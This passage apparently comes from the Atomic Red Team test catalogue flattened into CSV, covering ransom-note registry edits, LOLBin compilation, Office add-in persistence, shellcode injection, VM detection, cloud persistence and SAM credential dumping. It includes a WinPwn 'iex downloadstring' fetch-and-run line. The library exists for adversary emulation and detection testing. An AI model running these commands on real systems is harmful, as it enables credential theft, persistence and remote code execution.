Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force      ",powershell,True,,"Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeCaption -Value $orgLegalNoticeCaption -Type String -Force
Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LegalNoticeText -Value $orgLegalNoticeText -Type String -Force
",,,"input_arguments.legal_notice_caption.description: Title of ransom message

input_arguments.legal_notice_caption.type: string

input_arguments.legal_notice_caption.default: PYSA

input_arguments.legal_notice_text.description: Body of ransom message

input_arguments.legal_notice_text.type: string

input_arguments.legal_notice_text.default: Hi Company, every byte on any types of your devices was encrypted. Don't try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org

"
T1127,Trusted Developer Utilities Proxy Execution,Lolbin Jsc.exe compile javascript to exe,1ec1c269-d6bd-49e7-b71b-a461f7fa7bc8,"Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.
https://lolbas-project.github.io/lolbas/Binaries/Jsc/
https://www.phpied.com/make-your-javascript-a-windows-exe/
",windows,,,"copy ""#{filename}"" %TEMP%\hello.js
#{jscpath}\#{jscname} %TEMP%\hello.js
",command_prompt,,,"del %TEMP%\hello.js
del %TEMP%\hello.exe
",powershell,"dependencies.0.description: JavaScript code file must exist on disk at specified location (#{filename})

dependencies.0.prereq_command: if (Test-Path ""#{filename}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{filename}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/hello.js"" -OutFile ""#{filename}""

","input_arguments.filename.description: Location of the project file

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1127\src\hello.js

input_arguments.jscpath.description: Default location of jsc.exe

input_arguments.jscpath.type: path

input_arguments.jscpath.default: C:\Windows\Microsoft.NET\Framework\v4.0.30319

input_arguments.jscname.description: Default name of jsc

input_arguments.jscname.type: path

input_arguments.jscname.default: jsc.exe

"
T1127,Trusted Developer Utilities Proxy Execution,Lolbin Jsc.exe compile javascript to dll,3fc9fea2-871d-414d-8ef6-02e85e322b80,"Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.
https://lolbas-project.github.io/lolbas/Binaries/Jsc/
https://www.phpied.com/make-your-javascript-a-windows-exe/
",windows,,,"copy ""#{filename}"" %TEMP%\LibHello.js
#{jscpath}\#{jscname} /t:library %TEMP%\LibHello.js
",command_prompt,,,"del %TEMP%\LibHello.js
del %TEMP%\LibHello.dll
",powershell,"dependencies.0.description: JavaScript code file must exist on disk at specified location (#{filename})

dependencies.0.prereq_command: if (Test-Path ""#{filename}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{filename}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127/src/LibHello.js"" -OutFile ""#{filename}""

","input_arguments.filename.description: Location of the project file

input_arguments.filename.type: path

input_arguments.filename.default: PathToAtomicsFolder\T1127\src\LibHello.js

input_arguments.jscpath.description: Default location of jsc.exe

input_arguments.jscpath.type: path

input_arguments.jscpath.default: C:\Windows\Microsoft.NET\Framework\v4.0.30319

input_arguments.jscname.description: Default name of jsc

input_arguments.jscname.type: path

input_arguments.jscname.default: jsc.exe

"
T1137.006,Office Application Startup: Add-ins,Code Executed Via Excel Add-in File (XLL),441b1a0f-a771-428a-8af0-e99e4698cda3,"Loads an XLL file using the excel add-ins library.
This causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.
",windows,,,"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"")
}
else{
  Write-Host ""32-bit Office""
  $excelApp.RegisterXLL(""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")
}
",powershell,,,"Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
",,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Excel.Application"" | Out-Null
  Stop-Process -Name ""Excel""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

dependencies.1.description: XLL files must exist on disk at specified location
dependencies.1.prereq_command: if ((Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") -and (Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll""
",
T1137.006,Office Application Startup: Add-ins,Persistent Code Execution Via Excel Add-in File (XLL),9c307886-9fef-41d5-b344-073a0f5b2f5f,"Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
",windows,,,"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
$ver = $excelApp.version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options""
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process ""Excel""
",powershell,,,"$ver = (New-Object -COMObject ""Excel.Application"").version
Remove-Item ""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"" -ErrorAction Ignore
Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\AddIns\notepad.xll"" -ErrorAction Ignore
",,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Excel.Application"" | Out-Null
  Stop-Process -Name ""Excel""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

dependencies.1.description: XLL files must exist on disk at specified location
dependencies.1.prereq_command: if ((Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"") -and (Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"")) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll""
",
T1137.006,Office Application Startup: Add-ins,Persistent Code Execution Via Word Add-in File (WLL),95408a99-4fa7-4cd6-a7ef-cb65f86351cf,"Creates a Word Add-in file (WLL) which runs automatically when Word is started
The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
Successfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. 
",windows,,,"$wdApp = New-Object -COMObject ""Word.Application""
if(-not $wdApp.path.contains(""Program Files (x86)""))  
{
  Write-Host ""64-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""        
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"" ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll""
}
Stop-Process -Name ""WinWord"" 
Start-Process ""WinWord""
",powershell,,,"Stop-Process -Name ""notepad"",""WinWord"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\Word\Startup\notepad.wll"" -ErrorAction Ignore
",,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Word.Application"" | Out-Null
  Stop-Process -Name ""winword""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

dependencies.1.description: WLL files must exist on disk at specified location
dependencies.1.prereq_command: if ((Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"") -and (Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"")) {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll""
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll""
",
T1137.006,Office Application Startup: Add-ins,Persistent Code Execution Via Excel VBA Add-in File (XLAM),082141ed-b048-4c86-99c7-2b8da5b5bf48,"Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started
The sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.
",windows,,,"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"" ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam""        
Start-Process ""Excel""
",powershell,,,"Stop-Process -Name ""notepad"",""Excel"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"" -ErrorAction Ignore
",,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Excel.Application"" | Out-Null
  Stop-Process -Name ""Excel""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

dependencies.1.description: XLAM file must exist on disk at specified location
dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam""
",
T1137.006,Office Application Startup: Add-ins,Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM),f89e58f9-2b49-423b-ac95-1f3e7cfd8277,"Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started
The sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.
",windows,,,"Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"" ""$env:APPDATA\Microsoft\Addins\notepad.ppam""
$ver = (New-Object -COMObject ""PowerPoint.Application"").version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad""
New-Item -type Directory $ExcelRegPath -Force | Out-Null
New-ItemProperty $ExcelRegPath ""Autoload"" -value ""1"" -propertyType DWORD  | Out-Null
New-ItemProperty $ExcelRegPath ""Path"" -value ""notepad.ppam"" -propertyType string | Out-Null
Stop-Process -Name ""PowerPnt"" -ErrorAction Ignore
Start-Process ""PowerPnt""
",powershell,,,"$ver = (New-Object -COMObject ""PowerPoint.Application"").version
Remove-Item ""HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"" -ErrorAction Ignore
Stop-Process -Name ""notepad"",""PowerPnt"" -ErrorAction Ignore
Start-Sleep 3
Remove-Item ""$env:APPDATA\Microsoft\AddIns\notepad.ppam""  -ErrorAction Ignore",,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""PowerPoint.Application"" | Out-Null
  Stop-Process -Name ""PowerPnt""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft PowerPoint manually to meet this requirement""

dependencies.1.description: PPAM file must exist on disk at specified location
dependencies.1.prereq_command: if (Test-Path ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\T1137.006\bin\Addins\"" -Force | Out-Null
Invoke-Webrequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam""
",
T1055.003,Thread Execution Hijacking,Thread Execution Hijacking,578025d5-faa9-4f6d-8390-aae527d503e1,"This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the ""Atomic Red Team"" caption after one or two seconds. ",windows,,,"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""
Start-Sleep -Seconds 5
Stop-Process $notepad.id",powershell,,,,,,
T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (Linux),dfbd1a21-540d-4574-9731-e852bd6fe840,"systemd-detect-virt detects execution in a virtualized environment.
At boot, dmesg stores a log if a hypervisor is detected.
",linux,,,"if (systemd-detect-virt) then echo ""Virtualization Environment detected""; fi;
if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo ""Virtualization Environment detected""; fi;
",sh,True,,,,,
T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (FreeBSD),e129d73b-3e03-4ae9-bf1e-67fc8921e0fd,"Detects execution in a virtualized environment.
At boot, dmesg stores a log if a hypervisor is detected.
",linux,,,"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi
",sh,True,,,,,
T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (Windows),502a7dc4-9d6f-4d28-abf2-f0e84692562d,"Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine
",windows,,,"$error.clear()
Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue
if($error) {echo ""Virtualization Environment detected""}
",powershell,False,,"$error.clear()
",,,
T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (MacOS),a960185f-aef6-4547-8350-d1ce16680d09,"ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.
",macos,,,"if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
",sh,False,,,,,
T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows),4a41089a-48e0-47aa-82cb-5b81a463bc78,"Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. 
",windows,,,"$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""
$Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""
if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}
",powershell,False,,,,,
T1574.008,Hijack Execution Flow: Path Interception by Search Order Hijacking,powerShell Persistence via hijacking default modules - Get-Variable.exe,1561de08-0b4b-498e-8261-e922f3494aae,"Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\Local\Microsoft\WindowsApps and 
names it Get-Variable.exe for Windows 10 and above.
https://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/
",windows,,,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" ""PathToAtomicsFolder\T1574.008\bin\calc.cs""
Powershell -noprofile
",powershell,,,"Remove-Item ""$env:localappdata\Microsoft\WindowsApps\Get-Variable.exe"" -ErrorAction Ignore
Stop-Process -Name ""calculator""
",,,
T1078.004,Valid Accounts: Cloud Accounts,Creating GCP Service Account and Service Account Key,9fdd83fd-bd53-46e5-a716-9dec89c8ae8e,"GCP Service Accounts can be used to gain intial access as well as maintain persistence inside Google Cloud.
",google-workspace,iaas:gcp,,"gcloud config set project #{project-id}
gcloud iam service-accounts create #{service-account-name}
gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
",sh,False,,"gcloud iam service-accounts delete #{service-account-email} --quiet
",sh,"dependencies.0.description: Requires gcloud

dependencies.0.prereq_command: if [ -x ""$(command -v gcloud)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

dependencies.1.description: Check if user is logged in 

dependencies.1.prereq_command: gcloud config get-value account

dependencies.1.get_prereq_command: gcloud auth login --no-launch-browser

","input_arguments.project-id.description: ID of the project, you want to create service account as well as service account key for

input_arguments.project-id.type: string

input_arguments.project-id.default: art-project-1

input_arguments.service-account-name.description: Name of the service account

input_arguments.service-account-name.type: string

input_arguments.service-account-name.default: gcp-art-service-account-1

input_arguments.service-account-email.description: Email of the service account

input_arguments.service-account-email.type: string

input_arguments.service-account-email.default: gcp-art-service-account-1@art-project-1.iam.gserviceaccount.com

input_arguments.output-key-file.description: Email of the service account

input_arguments.output-key-file.type: string

input_arguments.output-key-file.default: gcp-art-service-account-1.json

"
T1078.004,Valid Accounts: Cloud Accounts,Azure Persistence Automation Runbook Created or Modified,348f4d14-4bd3-4f6b-bd8a-61237f78b3ac,"Identifies when an Azure Automation runbook is created or modified. An adversary may create or modify an Azure
Automation runbook to execute malicious code and maintain persistence in their target's environment.
",iaas:azure,,,"$secure_pwd = ""#{password}"" | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList ""#{username}"", $secure_pwd
Connect-AzAccount -Credential $creds
New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
",powershell,False,,"Remove-AzAutomationRunbook -AutomationAccountName #{automation_account_name} -Name #{runbook_name} -ResourceGroupName #{resource_group} -Force
cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
terraform destroy -auto-approve
",powershell,"dependencies.0.description: Check if terraform is installed.

dependencies.0.prereq_command: terraform version

dependencies.0.get_prereq_command: echo Please install terraform.

dependencies.1.description: Install-Module -Name Az

dependencies.1.prereq_command: try {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}

dependencies.1.get_prereq_command: Install-Module -Name Az -Scope CurrentUser -Force

dependencies.2.description: Check if the user is logged into Azure.

dependencies.2.prereq_command: az account show

dependencies.2.get_prereq_command: echo Configure your Azure account using: az login. 

dependencies.3.description: Create dependency resources using terraform

dependencies.3.prereq_command: try {if (Test-Path ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/terraform.tfstate"" ){ exit 0 } else {exit 1}} catch {exit 1}

dependencies.3.get_prereq_command: cd ""$PathToAtomicsFolder/T1078.004/src/T1078.004-2/""
terraform init
terraform apply -auto-approve

","input_arguments.username.description: Azure username

input_arguments.username.type: string

input_arguments.username.default: None

input_arguments.password.description: Azure password

input_arguments.password.type: string

input_arguments.password.default: None

input_arguments.resource_group.description: Name of the resource group

input_arguments.resource_group.type: string

input_arguments.resource_group.default: None

input_arguments.runbook_name.description: Name of the runbook name

input_arguments.runbook_name.type: string

input_arguments.runbook_name.default: None

input_arguments.automation_account_name.description: Name of the automation account name

input_arguments.automation_account_name.type: string

input_arguments.automation_account_name.default: None

"
T1078.004,Valid Accounts: Cloud Accounts,GCP - Create Custom IAM Role,3a159042-69e6-4398-9a69-3308a4841c85,"This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*. The idea for this Atomic came from a Rule published by the Elastic team.

Identifies an Identity and Access Management (IAM) custom role creation in Google Cloud Platform (GCP). 
Custom roles are user-defined, and allow for the bundling of one or more supported permissions to meet specific needs. 
Custom roles will not be updated automatically and could lead to privilege creep if not carefully scrutinized.

This atomic will create a new IAM role. The default role permissions are: *IAM Service Account Get*

Reference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/initial_access_gcp_iam_custom_role_creation.toml
",iaas:gcp,,,"gcloud config set project #{project-id}
gcloud iam roles create #{role-name} --description=""#{role-description}"" --permissions=#{roles} --project=#{project-id}
",sh,False,,"gcloud iam roles delete #{role-name} --project=#{project-id}
",sh,"dependencies.0.description: Requires gcloud

dependencies.0.prereq_command: if [ -x ""$(command -v gcloud)"" ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: echo ""Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install""

dependencies.1.description: Check if user is logged in 

dependencies.1.prereq_command: gcloud config get-value account

dependencies.1.get_prereq_command: gcloud auth login --no-launch-browser

","input_arguments.project-id.description: ID of the GCP Project you to execute the command against.

input_arguments.project-id.type: string

input_arguments.project-id.default: atomic-test-1

input_arguments.role-name.description: The name of the role to be created.

input_arguments.role-name.type: string

input_arguments.role-name.default: AtomicRedTeamRole

input_arguments.role-description.description: The description of the role to be created.

input_arguments.role-description.type: string

input_arguments.role-description.default: Atomic Red Team Custom IAM Role

input_arguments.roles.description: List of roles to be applied

input_arguments.roles.type: string

input_arguments.roles.default: iam.serviceAccounts.get

"
T1003.002,OS Credential Dumping: Security Account Manager,"Registry dump of SAM, creds, and secrets",5c2571d0-1572-416d-9676-812e64ca9f44,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
",windows,,,"reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
",command_prompt,True,,"del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
",,,
T1003.002,OS Credential Dumping: Security Account Manager,Registry parse with pypykatz,a96872b2-cbf3-46cf-8eb4-27e8c0e85263,"Parses registry hives to obtain stored credentials
",windows,,,"pypykatz live registry
",command_prompt,True,,,command_prompt,"dependencies.0.description: Computer must have python 3 installed

dependencies.0.prereq_command: py -3 --version >nul 2>&1
exit /b %errorlevel%

dependencies.0.get_prereq_command: echo ""Python 3 must be installed manually""

dependencies.1.description: Computer must have pip installed

dependencies.1.prereq_command: py -3 -m pip --version >nul 2>&1
exit /b %errorlevel%

dependencies.1.get_prereq_command: echo ""PIP must be installed manually""

dependencies.2.description: pypykatz must be installed and part of PATH

dependencies.2.prereq_command: pypykatz -h >nul 2>&1
exit /b %errorlevel%

dependencies.2.get_prereq_command: pip install pypykatz

",
T1003.002,OS Credential Dumping: Security Account Manager,esentutl.exe SAM copy,a90c2f4d-6726-444e-99d2-a00cd7c20480,"Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
",windows,,,"esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
",command_prompt,True,,"del #{copy_dest}\#{file_name} >nul 2>&1
",,,"input_arguments.file_path.description: Path to the file to copy

input_arguments.file_path.type: path

input_arguments.file_path.default: %SystemRoot%/system32/config/SAM

input_arguments.file_name.description: Name of the copied file

input_arguments.file_name.type: string

input_arguments.file_name.default: SAM

input_arguments.copy_dest.description: Destination of the copied file

input_arguments.copy_dest.type: string

input_arguments.copy_dest.default: %temp%

"
T1003.002,OS Credential Dumping: Security Account Manager,PowerDump Hashes and Usernames from Registry,804f28fc-68fc-40da-b5a2-e9d0bce5c193,Executes a hashdump by reading the hashes from the registry.,windows,,,"Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green
Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""
Invoke-PowerDump",powershell,True,,,,"dependencies.0.description: PowerDump script must exist on disk at specified location
dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"") {exit 0} else {exit 1} 
dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""
",
T1003.002,OS Credential Dumping: Security Account Manager,dump volume shadow copy hives with certutil,eeb9751a-d598-42d3-b11c-c122d9c3f6c7,"Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as ""HiveNightmare"" or ""SeriousSAM"".
This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",windows,,,"for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
",command_prompt,False,,"for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
",,,"input_arguments.target_hive.description: Hive you wish to dump

input_arguments.target_hive.type: string

input_arguments.target_hive.default: SAM

input_arguments.limit.description: Limit to the number of shadow copies to iterate through when trying to copy the hive

input_arguments.limit.type: integer

input_arguments.limit.default: 10

"
T1003.002,OS Credential Dumping: Security Account Manager,dump volume shadow copy hives with System.IO.File,9d77fed7-05f8-476e-a81b-8ff0472c64d0,"Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
",windows,,,"1..#{limit} | % { 
 try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}"" , ""$env:TEMP\#{target_hive}vss$_"", ""true"") } catch {}
 ls ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
",powershell,False,,"1..#{limit} | % {
  rm ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
",,,"input_arguments.target_hive.description: Hive you wish to dump

input_arguments.target_hive.type: string

input_arguments.target_hive.default: SAM

input_arguments.limit.description: Limit to the number of shadow copies to iterate through when trying to copy the hive

input_arguments.limit.type: integer

input_arguments.limit.default: 10

"
T1003.002,OS Credential Dumping: Security Account Manager,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,0c0f5f06-166a-4f4d-bb4a-719df9a01dbb,Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive  ",powershell,,,,,,
T1518,Software Discovery,Find and Display Internet Explorer Browser Version,68981660-6670-47ee-a5fa-7e74806420a4,"Query the registry to determine the version of internet explorer installed on the system.
